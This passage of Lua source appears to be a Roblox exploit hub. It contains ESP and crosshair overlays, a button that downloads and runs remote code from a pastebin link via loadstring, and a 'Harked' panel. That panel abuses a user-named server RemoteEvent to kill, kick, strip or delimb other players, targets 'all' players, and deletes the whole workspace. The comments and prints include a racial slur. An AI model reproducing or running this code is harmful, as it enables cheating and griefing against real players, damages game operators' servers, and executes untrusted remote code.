								Tracer.To = Vector2.new(ScreenPosition.X, ScreenPosition.Y);
								Tracer.Color = Color;
							else
								Tracer.Visible = false;
							end
							if Options.ShowBoxes.Value and HumanoidRootPart then
								Box:Update(HumanoidRootPart.CFrame, Vector3.new(2, 3, 0) * (Scale * 2), Color);
							else
								Box:SetVisible(false);
							end
						else
							NameTag.Visible = false;
							DistanceTag.Visible = false;
							Tracer.Visible = false;
							HeadDot.Visible = false;

							Box:SetVisible(false);
						end
					end
				else
					NameTag.Visible = false;
					DistanceTag.Visible = false;
					Tracer.Visible = false;
					HeadDot.Visible = false;

					Box:SetVisible(false);
				end

				shared.PlayerData[v.Name] = Data;
			end
		end
	end

	function Update()
		for i, v in pairs(shared.PlayerData) do
			if not Players:FindFirstChild(tostring(i)) then
				GetTableData(v.Instances)(function(i, obj)
					obj.Visible = false;
					obj:Remove();
					v.Instances[i] = nil;
				end)
				shared.PlayerData[i] = nil;
			end
		end

		local CX = Menu:GetInstance'CrosshairX';
		local CY = Menu:GetInstance'CrosshairY';
		if Options.Crosshair.Value then
			CX.Visible = true;
			CY.Visible = true;

			CX.To = Vector2.new((Camera.ViewportSize.X / 2) - 8, (Camera.ViewportSize.Y / 2));
			CX.From = Vector2.new((Camera.ViewportSize.X / 2) + 8, (Camera.ViewportSize.Y / 2));
			CY.To = Vector2.new((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) - 8);
			CY.From = Vector2.new((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) + 8);
		else
			CX.Visible = false;
			CY.Visible = false;
		end

		if Options.MenuOpen.Value and MenuLoaded then
			local MLocation = GetMouseLocation();
			shared.MenuDrawingData.Instances.Main.Color = Color3.fromHSV(tick() * 24 % 255/255, 1, 1);
			local MainInstance = Menu:GetInstance'Main';
			local Values = {
				MainInstance.Position.X;
				MainInstance.Position.Y;
				MainInstance.Position.X + MainInstance.Size.X;
				MainInstance.Position.Y + MainInstance.Size.Y;
			};
			if MainInstance and MouseHoveringOver(Values) then
				Debounce.CursorVis = true;
				-- GUIService:SetMenuIsOpen(true);
				Menu:UpdateMenuInstance'Cursor1'{
					Visible = true;
					From = Vector2.new(MLocation.x, MLocation.y);
					To = Vector2.new(MLocation.x + 5, MLocation.y + 6);
				}
				Menu:UpdateMenuInstance'Cursor2'{
					Visible = true;
					From = Vector2.new(MLocation.x, MLocation.y);
					To = Vector2.new(MLocation.x, MLocation.y + 8);
				}
				Menu:UpdateMenuInstance'Cursor3'{
					Visible = true;
					From = Vector2.new(MLocation.x, MLocation.y + 6);
					To = Vector2.new(MLocation.x + 5, MLocation.y + 5);
				}
			else
				if Debounce.CursorVis then
					Debounce.CursorVis = false;
					-- GUIService:SetMenuIsOpen(false);
					Menu:UpdateMenuInstance'Cursor1'{Visible = false};
					Menu:UpdateMenuInstance'Cursor2'{Visible = false};
					Menu:UpdateMenuInstance'Cursor3'{Visible = false};
				end
			end
			if MouseHeld then
				if Dragging then
					DraggingWhat.Slider.Position = Vector2.new(math.clamp(MLocation.X, DraggingWhat.Line.From.X, DraggingWhat.Line.To.X), DraggingWhat.Slider.Position.Y);
					local Percent = (DraggingWhat.Slider.Position.X - DraggingWhat.Line.From.X) / ((DraggingWhat.Line.To.X - DraggingWhat.Line.From.X));
					local Value = CalculateValue(DraggingWhat.Min, DraggingWhat.Max, Percent);
					DraggingWhat.Option(Value);
				elseif DraggingUI then
					Debounce.UIDrag = true;
					local Main = Menu:GetInstance'Main';
					local MousePos = GetMouseLocation();
					Main.Position = MousePos + DragOffset;
				end
			else
				Dragging = false;
				if DraggingUI and Debounce.UIDrag then
					Debounce.UIDrag = false;
					DraggingUI = false;
					CreateMenu(Menu:GetInstance'Main'.Position);
				end
			end
			if not Debounce.Menu then
				Debounce.Menu = true;
				ToggleMenu();
			end
		elseif Debounce.Menu and not Options.MenuOpen.Value then
			Debounce.Menu = false;
			ToggleMenu();
		end
	end

	RunService:UnbindFromRenderStep(GetDataName);
	RunService:UnbindFromRenderStep(UpdateName);

	RunService:BindToRenderStep(GetDataName, 1, UpdatePlayerData);
	RunService:BindToRenderStep(UpdateName, 1, Update);
end)

UICorner_19.Parent = ESP

SPY.Name = "SPY"
SPY.Parent = HUB
SPY.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SPY.BackgroundTransparency = 0.250
SPY.Position = UDim2.new(0.068681322, 0, 0.212938011, 0)
SPY.Size = UDim2.new(0, 313, 0, 50)
SPY.Font = Enum.Font.GothamBold
SPY.Text = "SIMPLE SPY"
SPY.TextColor3 = Color3.fromRGB(255, 255, 255)
SPY.TextSize = 14.000
SPY.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/We87LDxW'))()
end)

UICorner_20.Parent = SPY

Frame_6.Parent = HUB
Frame_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_6.BackgroundTransparency = 0.350
Frame_6.Position = UDim2.new(0.0680293813, 0, 0.785724819, 0)
Frame_6.Size = UDim2.new(0, 313, 0, 59)

UICorner_21.Parent = Frame_6

TextButton_6.Parent = Frame_6
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BackgroundTransparency = 1.000
TextButton_6.Position = UDim2.new(0.107034221, 0, -0.0169491544, 0)
TextButton_6.Size = UDim2.new(0, 247, 0, 63)
TextButton_6.Font = Enum.Font.SourceSansBold
TextButton_6.Text = "Credits To Lode & Sedonet"
TextButton_6.TextColor3 = Color3.fromRGB(239, 239, 239)
TextButton_6.TextSize = 27.000

HARKED.Name = "HARKED"
HARKED.Parent = HUB
HARKED.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HARKED.BackgroundTransparency = 0.250
HARKED.Position = UDim2.new(0.068681322, 0, 0.369272202, 0)
HARKED.Size = UDim2.new(0, 313, 0, 50)
HARKED.Font = Enum.Font.GothamBold
HARKED.Text = "LOAD HARKED"
HARKED.TextColor3 = Color3.fromRGB(255, 255, 255)
HARKED.TextSize = 14.000
HARKED.MouseButton1Click:Connect(function()
	local main = Instance.new("ScreenGui")
	local top = Instance.new("Frame")
	local back = Instance.new("Frame")
	local kill = Instance.new("TextButton")
	local btools = Instance.new("TextButton")
	local top_2 = Instance.new("TextLabel")
	local naked = Instance.new("TextButton")
	local credits = Instance.new("TextLabel")
	local hatless = Instance.new("TextButton")
	local sink = Instance.new("TextButton")
	local nuke = Instance.new("TextButton")
	local kick = Instance.new("TextButton")
	local target = Instance.new("TextBox")
	local queue = Instance.new("TextLabel")
	local nolimbs = Instance.new("TextButton")
	--Properties:
	main.Name = "main"
	main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

	top.Name = "top"
	top.Parent = main
	top.Draggable = true
	top.Active = true
	top.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
	top.BackgroundTransparency = 0.30000001192093
	top.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
	top.Position = UDim2.new(0.612145662, 0, 0.311965823, 0)
	top.Size = UDim2.new(0, 291, 0, 30)

	back.Name = "back"
	back.Parent = top
	back.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
	back.BackgroundTransparency = 0.30000001192093
	back.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
	back.BorderSizePixel = 0
	back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
	back.Size = UDim2.new(0, 293, 0, 293)

	kill.Name = "kill"
	kill.Parent = top
	kill.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	kill.BackgroundTransparency = 0.5
	kill.BorderSizePixel = 0
	kill.Position = UDim2.new(0.0206185561, 0, 1.76666665, 0)
	kill.Size = UDim2.new(0, 134, 0, 40)
	kill.Font = Enum.Font.SourceSansLight
	kill.Text = "Kill"
	kill.TextColor3 = Color3.new(1, 1, 1)
	kill.TextSize = 23

	btools.Name = "btools"
	btools.Parent = top
	btools.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	btools.BackgroundTransparency = 0.5
	btools.BorderSizePixel = 0
	btools.Position = UDim2.new(0.525773168, 0, 1.76666665, 0)
	btools.Size = UDim2.new(0, 131, 0, 40)
	btools.Font = Enum.Font.SourceSansLight
	btools.Text = "Btools"
	btools.TextColor3 = Color3.new(1, 1, 1)
	btools.TextSize = 23

	top_2.Name = "top"
	top_2.Parent = top
	top_2.BackgroundColor3 = Color3.new(1, 1, 1)
	top_2.BackgroundTransparency = 1
	top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
	top_2.Size = UDim2.new(0, 200, 0, 50)
	top_2.Font = Enum.Font.SourceSansLight
	top_2.Text = "Harked"
	top_2.TextColor3 = Color3.new(1, 1, 1)
	top_2.TextSize = 45

	naked.Name = "naked"
	naked.Parent = top
	naked.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	naked.BackgroundTransparency = 0.5
	naked.BorderSizePixel = 0
	naked.Position = UDim2.new(0.0206185561, 0, 3.56217241, 0)
	naked.Size = UDim2.new(0, 134, 0, 40)
	naked.Font = Enum.Font.SourceSansLight
	naked.Text = "Naked"
	naked.TextColor3 = Color3.new(1, 1, 1)
	naked.TextSize = 23

	credits.Name = "credits"
	credits.Parent = top
	credits.BackgroundColor3 = Color3.new(1, 1, 1)
	credits.BackgroundTransparency = 1
	credits.Position = UDim2.new(0, 0, 1, 0)
	credits.Size = UDim2.new(0, 291, 0, 23)
	credits.Font = Enum.Font.SourceSansLight
	credits.Text = "Commands/Scripts by Dong , UI by Unverified"
	credits.TextColor3 = Color3.new(1, 1, 1)
	credits.TextSize = 17
	credits.TextWrapped = true

	hatless.Name = "hatless"
	hatless.Parent = top
	hatless.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	hatless.BackgroundTransparency = 0.5
	hatless.BorderSizePixel = 0
	hatless.Position = UDim2.new(0.0206185561, 0, 5.39550591, 0)
	hatless.Size = UDim2.new(0, 134, 0, 40)
	hatless.Font = Enum.Font.SourceSansLight
	hatless.Text = "Hatless"
	hatless.TextColor3 = Color3.new(1, 1, 1)
	hatless.TextSize = 23

	sink.Name = "sink"
	sink.Parent = top
	sink.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	sink.BackgroundTransparency = 0.5
	sink.BorderSizePixel = 0
	sink.Position = UDim2.new(0.525773168, 0, 5.39550591, 0)
	sink.Size = UDim2.new(0, 131, 0, 40)
	sink.Font = Enum.Font.SourceSansLight
	sink.Text = "Sink"
	sink.TextColor3 = Color3.new(1, 1, 1)
	sink.TextSize = 23

	nuke.Name = "nuke"
	nuke.Parent = top
	nuke.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	nuke.BackgroundTransparency = 0.5
	nuke.BorderSizePixel = 0
	nuke.Position = UDim2.new(0.525773168, 0, 7.1955061, 0)
	nuke.Size = UDim2.new(0, 131, 0, 40)
	nuke.Font = Enum.Font.SourceSansLight
	nuke.Text = "Nuke"
	nuke.TextColor3 = Color3.new(1, 1, 1)
	nuke.TextSize = 23

	kick.Name = "kick"
	kick.Parent = top
	kick.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	kick.BackgroundTransparency = 0.5
	kick.BorderSizePixel = 0
	kick.Position = UDim2.new(0.0206185561, 0, 7.1955061, 0)
	kick.Size = UDim2.new(0, 134, 0, 40)
	kick.Font = Enum.Font.SourceSansLight
	kick.Text = "Kick"
	kick.TextColor3 = Color3.new(1, 1, 1)
	kick.TextSize = 23

	target.Name = "target"
	target.Parent = top
	target.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	target.BackgroundTransparency = 0.40000000596046
	target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
	target.Size = UDim2.new(0, 278, 0, 33)
	target.Font = Enum.Font.SourceSans
	target.Text = ""
	target.TextColor3 = Color3.new(1, 1, 1)
	target.TextSize = 23

	queue.Name = "queue"
	queue.Parent = top
	queue.BackgroundColor3 = Color3.new(1, 1, 1)
	queue.BackgroundTransparency = 1
	queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
	queue.Size = UDim2.new(0, 201, 0, 23)
	queue.Font = Enum.Font.SourceSans
	queue.Text = "Replication Queue: 0"
	queue.TextColor3 = Color3.new(1, 0, 0.0156863)
	queue.TextSize = 20
	queue.TextWrapped = true

	nolimbs.Name = "nolimbs"
	nolimbs.Parent = top
	nolimbs.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
	nolimbs.BackgroundTransparency = 0.5
	nolimbs.BorderSizePixel = 0
	nolimbs.Position = UDim2.new(0.525773168, 0, 3.56217265, 0)
	nolimbs.Size = UDim2.new(0, 131, 0, 40)
	nolimbs.Font = Enum.Font.SourceSansLight
	nolimbs.Text = "NoLimbs"
	nolimbs.TextColor3 = Color3.new(1, 1, 1)
	nolimbs.TextSize = 23

	-- SLAVE'S WORK --

	for i,slaves in pairs(game:GetDescendants()) do
		if slaves.Name == VALUE.Text then
			print("no u")


			kill.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,c in pairs(game.Players:GetPlayers()) do
						ohok = c.Character["Head"]
						slaves:FireServer(ohok, {Value = ohok})
					end
				else
					if game.Players:FindFirstChild(target.Text) then
						if game.Players:FindFirstChild(target.Text).Character then
							slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
							print("nibba who this")

						end

					end

				end
			end)

			btools.MouseButton1Down:connect(function()
				local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
				local Equipped = false

				Tool.RequiresHandle = false
				Tool.Name = "Destroy Tool"
				local Field = Instance.new("SelectionBox",game.Workspace)
				local Mouse = game.Players.LocalPlayer:GetMouse()
				Field.LineThickness = 0.1

				Tool.Equipped:connect(function()
					Equipped = true

					while Equipped == true do
						if Mouse.Target ~= nil then
							Field.Adornee = Mouse.Target

						else
							Field.Adornee = nil
						end
						wait()
					end
				end)

				Tool.Unequipped:connect(function()
					Equipped = false
					Field.Adornee = nil
				end)

				Tool.Activated:connect(function()
					if Mouse.Target ~= nil then
						slaves:FireServer(Mouse.Target, {Value = Mouse.Target})
						local AttemptTarget = Mouse.Target
						while AttemptTarget ~= nil do
							AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
							AttemptTarget.CanCollide = false
							wait()
						end

					end
				end)
			end)

			naked.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,c in pairs(game.Players:GetPlayers()) do
						ohok = c.Character.Shirt
						ohoka = c.Character.Pants
						slaves:FireServer(ohok, {Value = ohok})
						slaves:FireServer(ohoka, {Value = ohoka})
					end
				else
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Shirt, {Value = game.Players:FindFirstChild(target.Text).Character.Shirt})
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Pants, {Value = game.Players:FindFirstChild(target.Text).Character.Pants})
				end
			end)

			nolimbs.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,c in pairs(game.Players:GetPlayers()) do
						ohok = c.Character["Right Arm"]
						ohoka = c.Character["Left Arm"]
						ohokb = c.Character["Right Leg"]
						ohokc = c.Character["Left Leg"]
						slaves:FireServer(ohok, {Value = ohok})
						slaves:FireServer(ohoka, {Value = ohoka})
						slaves:FireServer(ohokb, {Value = ohokb})
						slaves:FireServer(ohokc, {Value = ohokc})
					end
				else
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Arm"]})
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Leg"]})
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Arm"]})
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Leg"]})
				end
			end)

			hatless.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,x in pairs(game.Players:GetPlayers()) do
						for i,c in pairs(x.Character:GetChildren()) do
							if c:IsA("Accessory") then
								ohok = c
								slaves:FireServer(ohok, {Value = ohok})


							end
						end
					end
				else
					for i, hats in pairs(game.Players:FindFirstChild(target.Text).Character:GetChildren()) do
						if hats:IsA("Accessory") then
							slaves:FireServer(hats, {Value = hats })
						end
					end
				end
			end)

			sink.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,c in pairs(game.Players:GetPlayers()) do
						ohok = c.Character.HumanoidRootPart
						slaves:FireServer(ohok, {Value = ohok})
					end
				else
					slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
				end
			end)

			kick.MouseButton1Down:connect(function()
				if string.lower(target.Text) == "all" then
					for i,c in pairs(game.Players:GetPlayers()) do
						ohok = c
						slaves:FireServer(ohok, {Value = ohok})
					end
				else
					slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
				end
			end)

			nuke.MouseButton1Down:connect(function()
				for i,c in pairs(game.Workspace:GetChildren()) do
					ohok = c
					slaves:FireServer(ohok, {Value = ohok})
				end
			end)

		end
	end
end)

UICorner_22.Parent = HARKED

VALUE.Name = "VALUE"
VALUE.Parent = HUB
VALUE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VALUE.BackgroundTransparency = 0.800
VALUE.Position = UDim2.new(0.068681322, 0, 0.528301895, 0)
VALUE.Size = UDim2.new(0, 312, 0, 46)
VALUE.Font = Enum.Font.GothamBold
VALUE.PlaceholderColor3 = Color3.fromRGB(94, 94, 94)
VALUE.PlaceholderText = "RemoteEventName.."
VALUE.Text = ""
VALUE.TextColor3 = Color3.fromRGB(94, 94, 94)
VALUE.TextSize = 20.000

UICorner_23.Parent = VALUE

CLOSE.Name = "CLOSE"
CLOSE.Parent = HUB
CLOSE.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
CLOSE.BackgroundTransparency = 0.150
CLOSE.Position = UDim2.new(0.873626411, 0, -0.0889487863, 0)
CLOSE.Size = UDim2.new(0, 72, 0, 50)
CLOSE.Font = Enum.Font.GothamBold
CLOSE.Text = "Close"
CLOSE.TextColor3 = Color3.fromRGB(255, 255, 255)
CLOSE.TextSize = 14.000
CLOSE.MouseButton1Click:Connect(function()
	HUB.Visible = false
end)

UICorner_24.CornerRadius = UDim.new(1, 0)
UICorner_24.Parent = CLOSE

UICorner_25.Parent = CLOSE
    
